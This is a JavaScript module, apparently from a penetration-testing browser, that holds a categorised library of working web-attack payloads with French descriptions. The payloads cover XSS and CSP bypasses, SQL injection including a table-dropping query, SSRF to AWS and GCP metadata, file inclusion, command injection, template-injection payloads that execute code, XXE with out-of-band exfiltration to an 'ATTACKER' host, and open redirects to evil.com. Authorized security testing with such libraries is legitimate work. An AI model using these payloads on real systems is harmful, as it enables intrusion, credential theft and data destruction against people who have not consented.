/**
 * ========================================================================
 * ShadowNet Browser — Payload Injector
 * ========================================================================
 *
 * Bibliothèque de payloads de test pré-chargés pour le test de
 * pénétration web. Les payloads sont organisés par catégorie de
 * vulnérabilité et accessibles via le menu contextuel ou le sidebar.
 *
 * AVERTISSEMENT LÉGAL :
 * Ces payloads sont destinés EXCLUSIVEMENT aux tests de sécurité
 * autorisés (pentest avec contrat, bug bounty, tests sur vos propres
 * applications). L'utilisation non autorisée est illégale.
 *
 * Catégories :
 * - XSS (Cross-Site Scripting)
 * - SQLi (SQL Injection)
 * - SSRF (Server-Side Request Forgery)
 * - LFI/RFI (Local/Remote File Inclusion)
 * - Command Injection
 * - SSTI (Server-Side Template Injection)
 * - XXE (XML External Entity)
 * - Open Redirect
 */

class PayloadInjector {
  constructor() {
    this.payloads = this._buildPayloadLibrary();
  }

  /**
   * Obtenir toutes les catégories de payloads
   */
  getCategories() {
    return Object.keys(this.payloads);
  }

  /**
   * Obtenir les payloads d'une catégorie
   */
  getPayloads(category) {
    return this.payloads[category] || [];
  }

  /**
   * Obtenir tous les payloads sous forme plate
   */
  getAllPayloads() {
    const all = [];
    for (const [category, payloads] of Object.entries(this.payloads)) {
      for (const payload of payloads) {
        all.push({ ...payload, category });
      }
    }
    return all;
  }

  /**
   * Rechercher des payloads par mot-clé
   */
  search(query) {
    const q = query.toLowerCase();
    return this.getAllPayloads().filter(p =>
      p.name.toLowerCase().includes(q) ||
      p.payload.toLowerCase().includes(q) ||
      p.description.toLowerCase().includes(q) ||
      p.category.toLowerCase().includes(q)
    );
  }

  /**
   * Construire la bibliothèque complète de payloads
   */
  _buildPayloadLibrary() {
    return {
      // ─── XSS (Cross-Site Scripting) ──────────────────────────────
      'XSS': [
        {
          name: 'Alert basique',
          payload: '<script>alert(1)</script>',
          description: 'Test XSS le plus simple — vérifie si les balises script sont filtrées',
          context: 'Reflected/Stored XSS'
        },
        {
          name: 'Event handler IMG',
          payload: '<img src=x onerror=alert(1)>',
          description: 'Contourne les filtres qui bloquent <script> mais pas les event handlers',
          context: 'Bypass filtre script'
        },
        {
          name: 'SVG onload',
          payload: '<svg onload=alert(1)>',
          description: 'XSS via SVG — souvent non filtré car SVG est considéré comme image',
          context: 'Bypass filtre HTML'
        },
        {
          name: 'Double encodage',
          payload: '%253Cscript%253Ealert(1)%253C/script%253E',
          description: 'Double URL-encode pour contourner un décodage unique côté serveur',
          context: 'Bypass WAF/décodage'
        },
        {
          name: 'Polyglot XSS',
          payload: 'javascript:/*--></title></style></textarea></script><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
          description: 'Payload polyglotte qui fonctionne dans plusieurs contextes HTML',
          context: 'Multi-contexte'
        },
        {
          name: 'Template literal',
          payload: '${alert(1)}',
          description: 'XSS via template literals JavaScript (ES6+)',
          context: 'Injection dans template strings'
        },
        {
          name: 'DOM XSS via hash',
          payload: '#<img src=x onerror=alert(1)>',
          description: 'DOM-based XSS via le hash de l\'URL (window.location.hash)',
          context: 'DOM-based XSS'
        },
        {
          name: 'Bypass CSP inline',
          payload: '<script src="data:text/javascript,alert(1)"></script>',
          description: 'Tente de contourner CSP en utilisant un data URI',
          context: 'Bypass CSP'
        }
      ],

      // ─── SQL Injection ───────────────────────────────────────────
      'SQLi': [
        {
          name: 'Test basique (quote)',
          payload: "' OR '1'='1",
          description: 'Test d\'injection SQL le plus simple — ferme la quote et ajoute une condition vraie',
          context: 'Login bypass, WHERE clause'
        },
        {
          name: 'Test basique (commentaire)',
          payload: "' OR 1=1--",
          description: 'Injection avec commentaire SQL pour ignorer le reste de la requête',
          context: 'Login bypass'
        },
        {
          name: 'UNION SELECT',
          payload: "' UNION SELECT NULL,NULL,NULL--",
          description: 'Détermine le nombre de colonnes via UNION SELECT (ajouter des NULL)',
          context: 'Extraction de données'
        },
        {
          name: 'Time-based blind',
          payload: "' AND SLEEP(5)--",
          description: 'Injection aveugle basée sur le temps — si la réponse prend 5s, l\'injection fonctionne',
          context: 'Blind SQLi (MySQL)'
        },
        {
          name: 'Boolean-based blind',
          payload: "' AND 1=1-- (true) / ' AND 1=2-- (false)",
          description: 'Comparer les réponses true/false pour extraire des données bit par bit',
          context: 'Blind SQLi'
        },
        {
          name: 'Error-based (MySQL)',
          payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
          description: 'Force une erreur MySQL qui révèle des données dans le message d\'erreur',
          context: 'Error-based SQLi'
        },
        {
          name: 'Stacked queries',
          payload: "'; DROP TABLE users;--",
          description: 'Test de requêtes empilées — DANGEREUX : peut supprimer des données',
          context: 'Stacked queries (MSSQL/PostgreSQL)'
        }
      ],

      // ─── SSRF (Server-Side Request Forgery) ──────────────────────
      'SSRF': [
        {
          name: 'Localhost',
          payload: 'http://127.0.0.1/',
          description: 'Accéder au serveur local depuis le serveur cible',
          context: 'SSRF basique'
        },
        {
          name: 'Metadata AWS',
          payload: 'http://169.254.169.254/latest/meta-data/',
          description: 'Accéder aux métadonnées AWS EC2 — peut exposer des credentials IAM',
          context: 'Cloud SSRF'
        },
        {
          name: 'Metadata GCP',
          payload: 'http://metadata.google.internal/computeMetadata/v1/',
          description: 'Accéder aux métadonnées Google Cloud Platform',
          context: 'Cloud SSRF'
        },
        {
          name: 'Internal port scan',
          payload: 'http://127.0.0.1:PORT/',
          description: 'Scanner les ports internes (remplacer PORT par 22, 3306, 6379, etc.)',
          context: 'Internal reconnaissance'
        },
        {
          name: 'File protocol',
          payload: 'file:///etc/passwd',
          description: 'Lire des fichiers locaux via le protocole file://',
          context: 'SSRF → LFI'
        },
        {
          name: 'DNS rebinding',
          payload: 'http://evil.com (résout vers 127.0.0.1)',
          description: 'Contourner les filtres IP via DNS rebinding',
          context: 'Bypass filtre SSRF'
        }
      ],

      // ─── LFI / RFI (File Inclusion) ──────────────────────────────
      'LFI/RFI': [
        {
          name: 'Path traversal basique',
          payload: '../../../../etc/passwd',
          description: 'Remonter l\'arborescence pour lire /etc/passwd',
          context: 'LFI Linux'
        },
        {
          name: 'Path traversal Windows',
          payload: '..\\..\\..\\..\\windows\\win.ini',
          description: 'Path traversal avec backslashes pour Windows',
          context: 'LFI Windows'
        },
        {
          name: 'Null byte (PHP < 5.3)',
          payload: '../../../../etc/passwd%00',
          description: 'Null byte pour tronquer l\'extension .php ajoutée par le code',
          context: 'LFI avec extension forcée'
        },
        {
          name: 'PHP wrapper (base64)',
          payload: 'php://filter/convert.base64-encode/resource=index.php',
          description: 'Lire le code source PHP encodé en Base64 via les wrappers PHP',
          context: 'LFI → Source disclosure'
        },
        {
          name: 'PHP input wrapper',
          payload: 'php://input',
          description: 'Exécuter du code PHP envoyé dans le body POST',
          context: 'LFI → RCE'
        },
        {
          name: 'Double encodage',
          payload: '..%252f..%252f..%252fetc/passwd',
          description: 'Double encodage URL pour contourner les filtres de traversée',
          context: 'Bypass filtre path'
        }
      ],

      // ─── Command Injection ───────────────────────────────────────
      'Command Injection': [
        {
          name: 'Pipe basique',
          payload: '| id',
          description: 'Exécuter la commande "id" via un pipe',
          context: 'OS command injection'
        },
        {
          name: 'Point-virgule',
          payload: '; id',
          description: 'Exécuter une commande supplémentaire avec point-virgule',
          context: 'Command chaining'
        },
        {
          name: 'Backticks',
          payload: '`id`',
          description: 'Exécution via substitution de commande (backticks)',
          context: 'Command substitution'
        },
        {
          name: 'Subshell',
          payload: '$(id)',
          description: 'Exécution via subshell $() — plus moderne que backticks',
          context: 'Command substitution'
        },
        {
          name: 'Newline injection',
          payload: '%0a id',
          description: 'Injection de newline pour exécuter une nouvelle commande',
          context: 'Bypass filtre ; et |'
        },
        {
          name: 'Blind (sleep)',
          payload: '| sleep 5',
          description: 'Test aveugle — si la réponse prend 5s, l\'injection fonctionne',
          context: 'Blind command injection'
        }
      ],

      // ─── SSTI (Server-Side Template Injection) ───────────────────
      'SSTI': [
        {
          name: 'Test Jinja2/Twig',
          payload: '{{7*7}}',
          description: 'Si "49" apparaît, le moteur de template évalue l\'expression',
          context: 'Détection SSTI'
        },
        {
          name: 'Test Smarty',
          payload: '{php}echo "test";{/php}',
          description: 'Exécution PHP via Smarty templates',
          context: 'Smarty SSTI'
        },
        {
          name: 'Jinja2 RCE',
          payload: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
          description: 'Remote Code Execution via Jinja2 en Python',
          context: 'Jinja2 RCE'
        },
        {
          name: 'ERB (Ruby)',
          payload: '<%= system("id") %>',
          description: 'Exécution de commande via ERB templates (Ruby on Rails)',
          context: 'ERB SSTI'
        },
        {
          name: 'Freemarker',
          payload: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
          description: 'RCE via Freemarker (Java)',
          context: 'Freemarker SSTI'
        }
      ],

      // ─── XXE (XML External Entity) ──────────────────────────────
      'XXE': [
        {
          name: 'File read basique',
          payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
          description: 'Lire un fichier local via une entité XML externe',
          context: 'XXE classique'
        },
        {
          name: 'SSRF via XXE',
          payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/">]><foo>&xxe;</foo>',
          description: 'SSRF via entité XML — accéder aux services internes',
          context: 'XXE → SSRF'
        },
        {
          name: 'Blind XXE (OOB)',
          payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd">%xxe;]><foo>test</foo>',
          description: 'XXE out-of-band — exfiltration vers un serveur contrôlé',
          context: 'Blind XXE'
        }
      ],

      // ─── Open Redirect ──────────────────────────────────────────
      'Open Redirect': [
        {
          name: 'Redirect basique',
          payload: '//evil.com',
          description: 'Redirection via protocol-relative URL',
          context: 'Open redirect'
        },
        {
          name: 'Redirect avec @',
          payload: 'https://trusted.com@evil.com',
          description: 'Utilise la syntaxe user@host pour rediriger',
          context: 'URL parsing confusion'
        },
        {
          name: 'JavaScript redirect',
          payload: 'javascript:window.location="https://evil.com"',
          description: 'Redirection via pseudo-protocole javascript:',
          context: 'JavaScript URI'
        },
        {
          name: 'Data URI redirect',
          payload: 'data:text/html,<script>location="https://evil.com"</script>',
          description: 'Redirection via data URI',
          context: 'Data URI abuse'
        }
      ]
    };
  }

  /**
   * Générer le HTML pour le panneau de payloads
   */
  renderPayloadPanel() {
    let html = '';
    for (const [category, payloads] of Object.entries(this.payloads)) {
      html += `
        <div class="payload-category">
          <div class="payload-category-header" data-category="${category}">
            <span>${category}</span>
            <span style="color:var(--text-muted)">${payloads.length}</span>
          </div>
          <div class="payload-list" data-category-list="${category}">
            ${payloads.map((p, i) => `
              <div class="payload-item" data-payload="${this._escapeAttr(p.payload)}" title="${this._escapeAttr(p.description)}">
                <strong>${this._escapeHtml(p.name)}</strong>
                <code style="color:var(--neon-green);font-size:9px;display:block;margin-top:2px">${this._escapeHtml(p.payload.substring(0, 80))}</code>
                <span class="payload-desc">${this._escapeHtml(p.context)}</span>
              </div>
            `).join('')}
          </div>
        </div>
      `;
    }
    return html;
  }

  _escapeHtml(str) {
    const div = document.createElement('div');
    div.textContent = str;
    return div.innerHTML;
  }

  _escapeAttr(str) {
    return str.replace(/"/g, '&quot;').replace(/'/g, '&#39;');
  }
}

// Exporter
if (typeof module !== 'undefined' && module.exports) {
  module.exports = { PayloadInjector };
}
if (typeof window !== 'undefined') {
  window.PayloadInjector = PayloadInjector;

  // Initialiser le panneau de payloads quand le DOM est prêt
  document.addEventListener('DOMContentLoaded', () => {
    const injector = new PayloadInjector();
    const container = document.getElementById('payload-categories');
    if (container) {
      container.innerHTML = injector.renderPayloadPanel();

      // Événements d'expansion des catégories
      container.querySelectorAll('.payload-category-header').forEach(header => {
        header.addEventListener('click', () => {
          const list = container.querySelector(`[data-category-list="${header.dataset.category}"]`);
          if (list) list.classList.toggle('expanded');
        });
      });

      // Copier le payload au clic
      container.querySelectorAll('.payload-item').forEach(item => {
        item.addEventListener('click', () => {
          const payload = item.dataset.payload;
          navigator.clipboard.writeText(payload).then(() => {
            window.showToast?.('success', 'Payload copié', payload.substring(0, 60) + '...');
          });
        });
      });
    }
  });
}
